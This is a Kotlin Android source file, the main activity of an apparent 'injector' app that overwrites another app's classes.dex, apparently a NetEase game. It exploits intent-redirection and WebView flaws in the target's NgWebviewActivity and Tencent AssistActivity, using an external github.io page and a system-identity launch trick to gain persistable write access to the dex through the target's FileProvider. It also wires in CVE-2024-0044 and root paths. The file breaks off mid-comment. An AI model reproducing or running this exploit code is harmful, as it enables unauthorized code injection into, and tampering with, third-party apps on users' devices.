package com.wunelezi.injector

import android.app.Dialog
import android.content.ComponentName
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Binder
import android.os.Bundle
import android.os.IBinder
import android.os.RemoteException
import com.wunelezi.injector.BuildConfig
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.AdapterView
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.ImageButton
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.Spinner
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.wunelezi.injector.adapter.AppAdapter
import com.wunelezi.injector.adapter.ModuleAdapter
import com.wunelezi.injector.databinding.ActivityMainBinding
import com.wunelezi.injector.databinding.DialogAppListBinding
import com.wunelezi.injector.databinding.DialogModuleListBinding
import com.wunelezi.injector.model.AppInfo
import com.wunelezi.injector.model.ImportResult
import com.wunelezi.injector.model.InjectionMethod
import com.wunelezi.injector.model.LoadResult
import com.wunelezi.injector.model.ModuleInfo
import com.wunelezi.injector.util.PluginManager
import rikka.shizuku.Shizuku
import rikka.shizuku.Shizuku.OnRequestPermissionResultListener
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    /** 当前模块列表数据（供删除后刷新） */
    private var moduleList: MutableList<ModuleInfo> = mutableListOf()
    private var moduleAdapter: ModuleAdapter? = null
    private var moduleDialog: Dialog? = null

    /** StartAnyWhere 回调标志 */
    private val STARTANYWHERE_CALLBACK = "wnlz_startanywhere_callback"

    /** 持久化文件名 */
    private val PREFS_NAME = "wnlz_injector_prefs"
    private val KEY_PACKAGE_NAME = "key_package_name"
    private val KEY_INJECTION_METHOD = "key_injection_method"
    /** 注入用基础 URL：intent2 序列化后的 intent scheme URI（url 编码）作为 ?intent= 参数拼接到此后 */
    private val INJECT_BASE_URL = "https://caofangkuai.github.io/WNLZ-Injector-dex/inject.html?intent="

    /** Shizuku 权限请求码 */
    private val SHIZUKU_PERMISSION_REQUEST_CODE = 9527

    /** 待处理的 Shizuku 权限授予回调 */
    private var shizukuPermissionCallback: ((Boolean) -> Unit)? = null

    /**
     * Shizuku.newProcess 方法引用缓存。
     *
     * 说明：Rikka 官方 13.x 将 newProcess 标记为 private 并推荐使用 UserService，但本设备运行的
     * 是 Shizuku 的 Stellar 分支（roro.stellar），该分支**重新启用并支持 newProcess**（其兼容层
     * 明确支持 newProcess）。而 UserService 方式在 Stellar 的 UserServiceStarter 中存在
     * LoadedApk.makeApplication 的 NPE 崩溃（直接创建新的 Android 进程去加载本应用 APK 时触发），
     * 换客户端 API 也绕不过（都走同一个服务端 UserServiceStarter）。
     *
     * newProcess 直接在 Shizuku/Stellar 服务端进程内 exec，不会创建新的 Android 进程，因此能稳定工作。
     * 由于 Rikka 客户端 jar 中该方法为 private，此处通过反射获取（proguard 已 keep rikka.shizuku.**）。
     */
    private val shizukuNewProcessMethod by lazy {
        Shizuku::class.java.getDeclaredMethod(
            "newProcess",
            Array<String>::class.java,
            Array<String>::class.java,
            String::class.java
        ).apply { isAccessible = true }
    }

    /** Shizuku binder 已连接监听（官方生命周期：binder 存活时才能调用 Shizuku API） */
    private val shizukuBinderReceivedListener = Shizuku.OnBinderReceivedListener {
        Log.d("WNLZ", "Shizuku binder received")
    }

    /** Shizuku binder 断开监听（官方生命周期） */
    private val shizukuBinderDeadListener = Shizuku.OnBinderDeadListener {
        Log.d("WNLZ", "Shizuku binder dead")
    }

    /** 加载对话框 */
    private var loadingDialog: Dialog? = null

    /** 自定义官包版本号（格式: versionName_versionCode，空则自动检测） */
    private var customVersion: String? = null

    /** 自动检测到的版本号（格式: versionName_versionCode） */
    private var autoDetectedVersion: String? = null

    /** SAF 文件选择 launcher */
    private val openFileLauncher = registerForActivityResult(
        ActivityResultContracts.OpenDocument()
    ) { uri: Uri? ->
        if (uri != null) {
            importPlugin(uri)
        }
    }

    /** 持久化（包名 + 注入方式） */
    private val prefs by lazy { getSharedPreferences(PREFS_NAME, MODE_PRIVATE) }

    private fun savePackageName(name: String) {
        prefs.edit().putString(KEY_PACKAGE_NAME, name).apply()
    }

    private fun saveInjectionMethod(method: InjectionMethod) {
        prefs.edit().putString(KEY_INJECTION_METHOD, method.name).apply()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setSupportActionBar(binding.toolbar)

        // 恢复持久化的包名与注入方式
        val savedPackageName = prefs.getString(KEY_PACKAGE_NAME, "").orEmpty()
        if (savedPackageName.isNotEmpty()) {
            binding.etPackageName.setText(savedPackageName)
            binding.etPackageName.setSelection(savedPackageName.length)
        }
        val savedMethodName = prefs.getString(KEY_INJECTION_METHOD, null)
        if (savedMethodName != null) {
            runCatching { InjectionMethod.valueOf(savedMethodName) }
                .getOrNull()
                ?.let { binding.methodSelector.setSelectedMethod(it) }
        }

        // 包名输入框 —— 长按弹出非系统应用列表
        binding.etPackageName.setOnLongClickListener {
            showAppListDialog()
            true
        }

        // 包名输入框 —— 文本变化时自动检测版本号 + 持久化
        binding.etPackageName.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                val pkg = s?.toString()?.trim().orEmpty()
                savePackageName(pkg)
                if (pkg.isEmpty()) {
                    autoDetectedVersion = null
                    updateVersionMenuItem()
                } else {
                    detectPackageVersion(pkg)
                }
            }
        })

        // 注入方式选择持久化
        binding.methodSelector.setOnMethodSelectedListener { method ->
            saveInjectionMethod(method)
        }

        // 注入模块选择卡片 —— 点击弹出模块列表
        binding.cardModules.setOnClickListener { showModuleListDialog() }

        // 注入按钮
        binding.btnInject.setOnClickListener {
            onInjectClicked()
        }

        // 初始更新模块摘要
        updateModuleSummary()

        // 启动时自动加载模块数量（静默，不报错）
        loadModuleSummary()

        // 检查是否从 StartAnyWhere 回调返回
        checkStartAnyWhereCallback(intent)

        // 注册 Shizuku 权限请求结果回调（CVE-2024-0044 注入方式需要）
        Shizuku.addRequestPermissionResultListener(shizukuPermissionListener)

        // 注册 Shizuku binder 生命周期监听（官方要求：binder 存活时才能调用 Shizuku API）
        Shizuku.addBinderReceivedListenerSticky(shizukuBinderReceivedListener)
        Shizuku.addBinderDeadListener(shizukuBinderDeadListener)
    }

    /** Shizuku 权限请求结果监听 */
    private val shizukuPermissionListener = OnRequestPermissionResultListener { requestCode, grantResult ->
        if (requestCode == SHIZUKU_PERMISSION_REQUEST_CODE) {
            val cb = shizukuPermissionCallback
            shizukuPermissionCallback = null
            cb?.invoke(grantResult == android.content.pm.PackageManager.PERMISSION_GRANTED)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Shizuku.removeRequestPermissionResultListener(shizukuPermissionListener)
        Shizuku.removeBinderReceivedListener(shizukuBinderReceivedListener)
        Shizuku.removeBinderDeadListener(shizukuBinderDeadListener)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        checkStartAnyWhereCallback(intent)
    }

    /**
     * 检查是否从 StartAnyWhere 回调返回
     *
     * 如果 intent 包含特殊标志符，说明 URI 权限已获取，显示 toast 提示用户再次点击注入
     */
    private fun checkStartAnyWhereCallback(intent: Intent?) {
        if (intent?.getStringExtra(STARTANYWHERE_CALLBACK) == "true") {
            // 收到回调：自动持久化 dexUri 的读写 URI 权限；仅此步报错才弹 dialog
            try {
                val data = intent.data
                if (data != null) {
                    contentResolver.takePersistableUriPermission(
                        data,
                        Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                    )
                }
            } catch (e: Exception) {
                showInjectErrorDialog(e)
            }
            Toast.makeText(this, "权限已获取，请再次点击注入按钮", Toast.LENGTH_LONG).show()
            // 清除标志，避免旋转屏幕重复触发
            intent.removeExtra(STARTANYWHERE_CALLBACK)
        }
    }

    override fun onResume() {
        super.onResume()
        // 从后台恢复时重新加载模块数量（静默，不报错）
        loadModuleSummary()
    }

    /**
     * 静默加载模块数量，更新主页面摘要
     *
     * 加载失败或为空时仅显示"未加载模块"，不弹任何错误对话框
     */
    private fun loadModuleSummary() {
        val packageName = binding.etPackageName.text?.toString()?.trim().orEmpty()
        if (packageName.isEmpty()) {
            moduleList.clear()
            updateModuleSummary()
            return
        }

        lifecycleScope.launch(Dispatchers.IO) {
            val modules = try {
                PluginManager.loadModules(this@MainActivity, packageName)
            } catch (e: Exception) {
                emptyList<ModuleInfo>()
            }
            withContext(Dispatchers.Main) {
                moduleList.clear()
                moduleList.addAll(modules)
                updateModuleSummary()
            }
        }
    }

    override fun onCreateOptionsMenu(menu: android.view.Menu): Boolean {
        menuInflater.inflate(R.menu.main_menu, menu)
        // 包名输入框已有内容，立即检测版本号
        val pkg = binding.etPackageName.text?.toString()?.trim().orEmpty()
        if (pkg.isNotEmpty()) {
            detectPackageVersion(pkg)
        }
        return true
    }

    override fun onOptionsItemSelected(item: android.view.MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_package_version -> {
                showVersionEditDialog()
                true
            }
            R.id.action_revoke_permissions -> {
                revokeAllPermissions()
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    // ==================== 释放所有权限 ====================

    private fun revokeAllPermissions() {
        try {
            val resolver = contentResolver
            val permissions = resolver.persistedUriPermissions
            for (perm in permissions) {
                resolver.releasePersistableUriPermission(
                    perm.uri,
                    Intent.FLAG_GRANT_READ_URI_PERMISSION or
                        Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                )
                Log.d("MainActivity", "已释放: " + perm.uri)
            }
            Toast.makeText(
                this,
                getString(R.string.toast_permissions_revoked) + " (" + permissions.size + " 个)",
                Toast.LENGTH_SHORT
            ).show()
        } catch (e: Exception) {
            Toast.makeText(
                this,
                getString(R.string.toast_permissions_revoke_failed) + ": " + e.toString(),
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    // ==================== 应用列表对话框 ====================

    private fun showAppListDialog() {
        val dialog = Dialog(this, R.style.Theme_WNLZInjector_NoAnim)
        val dialogBinding = DialogAppListBinding.inflate(layoutInflater)
        dialog.setContentView(dialogBinding.root)

        dialog.window?.let { window ->
            window.setLayout(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT
            )
            window.setGravity(Gravity.CENTER)
        }

        val adapter = AppAdapter { app ->
            binding.etPackageName.setText(app.packageName)
            binding.etPackageName.setSelection(app.packageName.length)
            dialog.dismiss()
        }

        dialogBinding.rvAppList.layoutManager = LinearLayoutManager(this)
        dialogBinding.rvAppList.adapter = adapter

        dialogBinding.btnClose.setOnClickListener { dialog.dismiss() }

        var allApps: List<AppInfo> = emptyList()
        dialogBinding.etSearch.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable?) {
                val query = s?.toString()?.trim()?.lowercase().orEmpty()
                val filtered = if (query.isEmpty()) allApps else allApps.filter {
                    it.appName.lowercase().contains(query) ||
                        it.packageName.lowercase().contains(query)
                }
                adapter.submitList(filtered)
            }
        })

        dialog.setOnDismissListener { allApps = emptyList() }

        dialog.show()

        dialogBinding.progressBar.visibility = android.view.View.VISIBLE
        lifecycleScope.launch(Dispatchers.IO) {
            allApps = loadNonSystemApps()
            withContext(Dispatchers.Main) {
                dialogBinding.progressBar.visibility = android.view.View.GONE
                adapter.submitList(allApps)
            }
        }
    }

    private fun loadNonSystemApps(): List<AppInfo> {
        val pm = packageManager
        val packages = pm.getInstalledApplications(0)
        return packages
            .filter { (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 }
            .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
            .map { appInfo ->
                AppInfo(
                    appName = pm.getApplicationLabel(appInfo).toString(),
                    packageName = appInfo.packageName,
                    icon = appInfo.loadIcon(pm)
                )
            }
    }

    // ==================== 模块列表对话框 ====================

    private fun showModuleListDialog() {
        val packageName = binding.etPackageName.text?.toString()?.trim().orEmpty()
        if (packageName.isEmpty()) {
            Toast.makeText(this, R.string.toast_no_package, Toast.LENGTH_SHORT).show()
            return
        }

        moduleDialog = Dialog(this, R.style.Theme_WNLZInjector_NoAnim)
        val dialogBinding = DialogModuleListBinding.inflate(layoutInflater)
        moduleDialog!!.setContentView(dialogBinding.root)

        moduleDialog!!.window?.let { window ->
            window.setLayout(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT
            )
            window.setGravity(Gravity.CENTER)
        }

        moduleAdapter = ModuleAdapter(moduleList)

        // 长按进入选择模式时，显示删除按钮栏
        moduleAdapter!!.onSelectionStarted = {
            dialogBinding.selectionBar.visibility = View.VISIBLE
        }

        // 选择项变化时更新计数
        moduleAdapter!!.onSelectionChanged = { count ->
            dialogBinding.tvSelectionCount.text = "已选择 $count 项"
        }

        dialogBinding.rvModuleList.layoutManager = LinearLayoutManager(this)
        dialogBinding.rvModuleList.adapter = moduleAdapter

        // 删除按钮
        dialogBinding.btnDelete.setOnClickListener {
            val selected = moduleAdapter?.getSelectedModules().orEmpty()
            if (selected.isEmpty()) {
                Toast.makeText(this, R.string.toast_delete_failed, Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
                .setTitle(R.string.btn_delete)
                .setMessage("确认删除 ${selected.size} 个模块？")
                .setPositiveButton(R.string.action_confirm) { _, _ ->
                    val toDelete = selected.map { it.zipName }.toSet()
                    lifecycleScope.launch(Dispatchers.IO) {
                        var allOk = true
                        for (zipName in toDelete) {
                            val ok = PluginManager.deletePlugin(this@MainActivity, packageName, zipName)
                            if (!ok) allOk = false
                        }
                        withContext(Dispatchers.Main) {
                            moduleAdapter?.removeModules(toDelete)
                            moduleAdapter?.exitSelectionMode()
                            dialogBinding.selectionBar.visibility = View.GONE
                            updateModuleSummary()
                            Toast.makeText(
                                this@MainActivity,
                                if (allOk) R.string.toast_delete_success else R.string.toast_delete_failed,
                                Toast.LENGTH_SHORT
                            ).show()
                        }
                    }
                }
                .setNegativeButton(R.string.action_cancel, null)
                .show()
        }

        dialogBinding.btnModuleClose.setOnClickListener {
            // 如果在选择模式，先退出选择模式
            moduleAdapter?.exitSelectionMode()
            dialogBinding.selectionBar.visibility = View.GONE
            moduleDialog?.dismiss()
        }

        // 导入按钮
        dialogBinding.btnImport.setOnClickListener {
            openFileLauncher.launch(arrayOf("application/zip", "*/*"))
        }

        moduleDialog!!.setOnDismissListener {
            moduleDialog = null
            moduleAdapter = null
        }

        moduleDialog!!.show()

        // 加载模块
        dialogBinding.progressBar.visibility = View.VISIBLE
        lifecycleScope.launch(Dispatchers.IO) {
            val loadResult = PluginManager.loadModulesWithLogs(this@MainActivity, packageName)
            withContext(Dispatchers.Main) {
                dialogBinding.progressBar.visibility = View.GONE
                moduleList.clear()
                moduleList.addAll(loadResult.modules)
                moduleAdapter?.notifyDataSetChanged()
                if (loadResult.modules.isEmpty()) {
                    dialogBinding.tvEmpty.visibility = View.VISIBLE
                }
            }
        }
    }

    // ==================== 导入插件 ====================

    /**
     * 导入插件
     */
    private fun importPlugin(uri: Uri) {
        val packageName = binding.etPackageName.text?.toString()?.trim().orEmpty()
        if (packageName.isEmpty()) {
            Toast.makeText(this, R.string.toast_no_package, Toast.LENGTH_SHORT).show()
            return
        }

        lifecycleScope.launch(Dispatchers.IO) {
            val result = PluginManager.importPlugin(this@MainActivity, packageName, uri)
            withContext(Dispatchers.Main) {
                if (result.success) {
                    // 导入成功：仅弹出 toast，并静默刷新模块列表
                    Toast.makeText(this@MainActivity, R.string.toast_import_success, Toast.LENGTH_SHORT).show()
                    refreshModuleList(packageName)
                } else {
                    showImportErrorDialog(result)
                }
            }
        }
    }

    /**
     * 显示导入失败详情对话框
     */
    private fun showImportErrorDialog(result: ImportResult) {
        val logsText = result.logs.joinToString("\n")
        val builder = com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
            .setTitle(R.string.dialog_import_failed_title)
            .setMessage(logsText)
            .setPositiveButton(R.string.action_confirm, null)

        builder.setNeutralButton(R.string.action_copy_log) { _, _ ->
            val clipboard = getSystemService(android.content.ClipboardManager::class.java)
            val clip = android.content.ClipData.newPlainText("import_error_log", logsText)
            clipboard?.setPrimaryClip(clip)
            Toast.makeText(this, R.string.toast_copied, Toast.LENGTH_SHORT).show()
        }

        builder.show()
    }

    /**
     * 刷新模块列表
     */
    private fun refreshModuleList(packageName: String) {
        lifecycleScope.launch(Dispatchers.IO) {
            val loadResult = PluginManager.loadModulesWithLogs(this@MainActivity, packageName)
            withContext(Dispatchers.Main) {
                moduleList.clear()
                moduleList.addAll(loadResult.modules)
                moduleAdapter?.notifyDataSetChanged()
                updateModuleSummary()
            }
        }
    }

    /**
     * 更新模块摘要
     */
    private fun updateModuleSummary() {
        binding.tvModuleSummary.text = if (moduleList.isEmpty()) {
            getString(R.string.hint_no_module)
        } else {
            "已加载 ${moduleList.size} 个模块"
        }
        binding.tvModuleSummary.setTextColor(
            getColor(if (moduleList.isEmpty()) R.color.text_hint else R.color.text_primary)
        )
    }

    // ==================== 官包版本号 ====================

    /**
     * 自动检测包名的版本号，更新 [autoDetectedVersion] 并刷新菜单项
     */
    private fun detectPackageVersion(packageName: String) {
        lifecycleScope.launch(Dispatchers.IO) {
            val version = try {
                val pm = packageManager
                val packageInfo = pm.getPackageInfo(packageName, 0)
                val vName = packageInfo.versionName ?: "unknown"
                val vCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
                    packageInfo.longVersionCode.toString()
                } else {
                    @Suppress("DEPRECATION")
                    packageInfo.versionCode.toString()
                }
                "${vName}_${vCode}"
            } catch (e: Exception) {
                null
            }
            withContext(Dispatchers.Main) {
                autoDetectedVersion = version
                updateVersionMenuItem()
            }
        }
    }

    /**
     * 更新菜单项标题，显示当前版本号
     */
    private fun updateVersionMenuItem() {
        // 优先显示自定义版本，否则显示自动检测版本
        val display = customVersion ?: autoDetectedVersion
        val menuItem = binding.toolbar.menu?.findItem(R.id.action_package_version)
        if (menuItem != null) {
            menuItem.title = if (display != null) {
                "官包版本号: $display"
            } else {
                getString(R.string.action_package_version)
            }
        }
    }

    /**
     * 弹出版本号编辑对话框
     */
    private fun showVersionEditDialog() {
        val currentDisplay = customVersion ?: autoDetectedVersion ?: ""

        val input = com.google.android.material.textfield.TextInputEditText(this).apply {
            setText(currentDisplay)
            hint = getString(R.string.dialog_version_hint)
            setSelection(length())
            inputType = android.text.InputType.TYPE_CLASS_TEXT
        }

        val container = com.google.android.material.textfield.TextInputLayout(this).apply {
            addView(input)
            hint = getString(R.string.dialog_version_hint)
            setBoxStrokeColorStateList(
                android.content.res.ColorStateList.valueOf(
                    getColor(R.color.primary)
                )
            )
            setPadding(48, 16, 48, 8)
        }

        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
            .setTitle(R.string.dialog_version_title)
            .setView(container)
            .setPositiveButton(R.string.action_confirm) { _, _ ->
                val text = input.text?.toString()?.trim().orEmpty()
                if (text.isEmpty()) {
                    // 留空 = 使用自动检测
                    customVersion = null
                    if (autoDetectedVersion != null) {
                        Toast.makeText(this, R.string.dialog_version_empty, Toast.LENGTH_SHORT).show()
                    }
                } else {
                    customVersion = text
                    Toast.makeText(this, R.string.toast_version_updated, Toast.LENGTH_SHORT).show()
                }
                updateVersionMenuItem()
            }
            .setNeutralButton(R.string.action_auto_detect) { _, _ ->
                customVersion = null
                if (autoDetectedVersion != null) {
                    Toast.makeText(this, R.string.dialog_version_empty, Toast.LENGTH_SHORT).show()
                }
                updateVersionMenuItem()
            }
            .setNegativeButton(R.string.action_cancel, null)
            .show()
    }

    // ==================== 注入按钮逻辑 ====================

    private fun onInjectClicked() {
        val packageName = binding.etPackageName.text?.toString()?.trim().orEmpty()
        if (packageName.isEmpty()) {
            Toast.makeText(this, R.string.toast_no_package, Toast.LENGTH_SHORT).show()
            return
        }

        val method = binding.methodSelector.getSelectedMethod()
        if (method == null) {
            Toast.makeText(this, R.string.toast_no_method, Toast.LENGTH_SHORT).show()
            return
        }

        when (method) {
            InjectionMethod.START_ANYWHERE_NGWEBVIEW -> startStartAnyWhereInjection(packageName)
            InjectionMethod.START_ANYWHERE_ASSIST -> startStartAnyWhereAssistInjection(packageName)
            InjectionMethod.CVE_2024_0044 -> startCve20240044Injection(packageName)
            InjectionMethod.ROOT -> startRootInjection(packageName)
        }
    }

    /**
     * StartAnyWhere 注入流程（NgWebviewActivity）
     *
     * 1. 构造目标 app 的 dex content URI（版本段优先用自定义版本 customVersion，否则自动检测）
     * 2. 以该 dexUri 构造 intent2（指向本 app MainActivity，携带 read/write/persist 授权 + NEW_TASK）
     * 3. intent2.toUri(URI_INTENT_SCHEME) 后 url 编码，拼接进基础 URL 的 ?intent= 参数，得到最终 web url
     * 4. createPackageContext 获取目标 app classLoader，反射构造 WebViewConfig（继承 WebviewParams）
     *    将最终 url 设为 webviewParams.url，并填入必要的显示参数
     * 5. 构造指向目标 app NgWebviewActivity 的 intent，以 "webviewParams" extra 携带 WebViewConfig
     * 6. 通过 StartAnyWhere.pullSpecialActivity 以系统身份启动
     */
    private fun startStartAnyWhereInjection(targetPackage: String) {
        showLoadingDialog()

        Thread {
            try {
                // 版本段：优先自定义版本，否则实时检测目标包的 versionName_versionCode
                val versionSegment = customVersion ?: run {
                    val pi = packageManager.getPackageInfo(targetPackage, 0)
                    val vName = pi.versionName ?: "unknown"
                    val vCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
                        pi.longVersionCode.toString()
                    } else {
                        @Suppress("DEPRECATION")
                        pi.versionCode.toString()
                    }
                    "${vName}_$vCode"
                }

                // 目标 dex 的 content URI
                val dexUriStr = "content://com.netease.x19.osdkcommon.fileprovider/name/data/data/$targetPackage/app_ntp0/$versionSegment/.unzip/classes.dex"
                val dexUri = Uri.parse(dexUriStr)
                val mimeType = contentResolver.getType(dexUri)

                // 3. 尝试读取 URI 判断是否有权限：takePersistableUriPermission 持久化授权后，读取几个字节验证可访问
                var hasPermission = false
                try {
                    contentResolver.takePersistableUriPermission(
                        dexUri,
                        Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                    )
                    val ins = contentResolver.openInputStream(dexUri)
                    if (ins != null) {
                        val buffer = ByteArray(4)
                        ins.read(buffer)
                        ins.close()
                        hasPermission = true
                    }
                } catch (e: Exception) {
                    hasPermission = false
                }

                // intent2：指向本 app MainActivity，携带 dexUri 授权 flags
                val intent2 = Intent()
                    .setComponent(ComponentName(packageName, "com.wunelezi.injector.MainActivity"))
                    .setDataAndType(dexUri, mimeType)
                    .addFlags(
                        Intent.FLAG_GRANT_READ_URI_PERMISSION or
                        Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
                        Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                        Intent.FLAG_ACTIVITY_NEW_TASK
                    )
                    .putExtra(STARTANYWHERE_CALLBACK, "true")

                // intent2 -> intent scheme URI -> url 编码 -> 拼接到基础 URL 的 ?intent= 参数
                val intentUri = intent2.toUri(Intent.URI_INTENT_SCHEME)
                val encodedIntent = java.net.URLEncoder.encode(intentUri, "UTF-8")
                val finalUrl = INJECT_BASE_URL + encodedIntent

                // 通过目标 app 的 classLoader 加载并构造 WebViewConfig
                val targetCtx = createPackageContext(targetPackage, android.content.Context.CONTEXT_IGNORE_SECURITY or android.content.Context.CONTEXT_INCLUDE_CODE)
                val cl = targetCtx.classLoader

                val webViewConfigClass = cl.loadClass("com.netease.ntunisdk.modules.ngwebviewgeneral.entity.WebViewConfig")
                val webViewConfig = webViewConfigClass.getConstructor().newInstance()

                // url -> WebviewParams.setUrl(String)
                webViewConfigClass.getMethod("setUrl", String::class.java).invoke(webViewConfig, finalUrl)

                // 其他按需填充的显示参数（方法缺失则忽略）
                val boolType = Boolean::class.javaPrimitiveType
                fun setBool(name: String, value: Boolean) = runCatching {
                    webViewConfigClass.getMethod(name, boolType).invoke(webViewConfig, value)
                }
                setBool("setFullScreen", true)
                setBool("setSupportBackKey", true)
                setBool("setCloseButtonVisible", true)

                val intent = Intent()
                    .setComponent(ComponentName(targetPackage, "com.netease.ntunisdk.modules.ngwebviewgeneral.ui.activity.NgWebviewActivity"))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .putExtra("webviewParams", webViewConfig as android.os.Parcelable)

                runOnUiThread {
                    hideLoadingDialog()
                    if (hasPermission) {
                        // 5. 已有权限：启动下载注入文件流程（下载/解压/writeUri）
                        downloadAndInject(targetPackage, versionSegment)
                    } else {
                        // 4. 无权限：通过 startanywhere 注入，intent2 携带的授权 flags 让目标 app 获得 dexUri 权限
                        Toast.makeText(this, "正在授权并注入...", Toast.LENGTH_SHORT).show()
                        com.cfks.startanywhere.StartAnyWhere.pullSpecialActivity(this, intent)
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    hideLoadingDialog()
                    showInjectErrorDialog(e)
                }
            }
        }.start()
    }

    /**
     * StartAnyWhere(AssistActivity) 注入流程
     *
     * 1. 构造目标 app 的 dex content URI（版本段优先用自定义版本 customVersion，否则自动检测）
     * 2. 以该 dexUri 构造 intent2（指向本 app MainActivity，携带 read/write/persist 授权 + NEW_TASK + callback）
     * 3. 以 intent2 构造 pendingIntent
     * 4. 构造指向目标 app 自带 com.tencent.connect.common.AssistActivity 的 intent1，
     *    将「原来的参数」(ExtraIntent(intent2) / key_extra_pending_intent(pendingIntent) / is_login)
     *    转成 Bundle 后用 putExtras 传递（不再逐个 putExtra）
     * 5. 通过 StartAnyWhere.pullSpecialActivity 以系统身份启动
     * 其余授权 / 注入 / 下载 dex 逻辑与 StartAnyWhere(NgWebviewActivity) 一致。
     */
    private fun startStartAnyWhereAssistInjection(targetPackage: String) {
        showLoadingDialog()

        Thread {
            try {
                // 版本段：优先自定义版本，否则实时检测目标包的 versionName_versionCode
                val versionSegment = customVersion ?: run {
                    val pi = packageManager.getPackageInfo(targetPackage, 0)
                    val vName = pi.versionName ?: "unknown"
                    val vCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
                        pi.longVersionCode.toString()
                    } else {
                        @Suppress("DEPRECATION")
                        pi.versionCode.toString()
                    }
                    "${vName}_$vCode"
                }

                // 目标 dex 的 content URI
                val dexUriStr = "content://com.netease.x19.osdkcommon.fileprovider/name/data/data/$targetPackage/app_ntp0/$versionSegment/.unzip/classes.dex"
                val dexUri = Uri.parse(dexUriStr)
                val mimeType = contentResolver.getType(dexUri)

                // 尝试读取 URI 判断是否有权限：takePersistableUriPermission 持久化授权后，读取几个字节验证可访问
                var hasPermission = false
                try {
                    contentResolver.takePersistableUriPermission(
                        dexUri,
                        Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                    )
                    val ins = contentResolver.openInputStream(dexUri)
                    if (ins != null) {
                        val buffer = ByteArray(4)
                        ins.read(buffer)
                        ins.close()
                        hasPermission = true
                    }
                } catch (e: Exception) {
                    hasPermission = false
                }

                // intent2：指向本 app MainActivity，携带 dexUri 授权 flags + callback
                val intent2 = Intent()
                    .setComponent(ComponentName(packageName, "com.wunelezi.injector.MainActivity"))
                    .setDataAndType(dexUri, mimeType)
                    .addFlags(
                        Intent.FLAG_GRANT_READ_URI_PERMISSION or
                        Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
                        Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                        Intent.FLAG_ACTIVITY_NEW_TASK
                    )
                    .putExtra(STARTANYWHERE_CALLBACK, "true")

                // pendingIntent：基于 intent2
                val pendingIntent = android.app.PendingIntent.getActivity(
                    this, 0, intent2,
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                )

                // intent1（授权）：指向目标 app 自带的 com.tencent.connect.common.AssistActivity，
                // 将原来的参数转成 Bundle 后用 putExtras 传递
                val assistParams = android.os.Bundle()
                assistParams.putParcelable("openSDK_LOG.AssistActivity.ExtraIntent", intent2)
                assistParams.putParcelable("key_extra_pending_intent", pendingIntent)
                assistParams.putBoolean("is_login", true)

                val intent = Intent()
                    .setComponent(ComponentName(targetPackage, "com.tencent.connect.common.AssistActivity"))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .putExtras(assistParams)

                runOnUiThread {
                    hideLoadingDialog()
                    if (hasPermission) {
                        // 已有权限：启动下载注入文件流程（下载/解压/writeUri）
                        downloadAndInject(targetPackage, versionSegment)
                    } else {
                        // 无权限：通过 startanywhere 注入，授予目标 app dexUri 权限
                        Toast.makeText(this, "正在授权并注入...", Toast.LENGTH_SHORT).show()
                        com.cfks.startanywhere.StartAnyWhere.pullSpecialActivity(this, intent)
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    hideLoadingDialog()
                    showInjectErrorDialog(e)
                }
            }
        }.start()
    }

    // ==================== CVE-2024-0044 注入流程 ====================

    /** Shizuku 执行命令的返回结果 */
    private data class ShellResult(val exitCode: Int, val output: String)

    /**
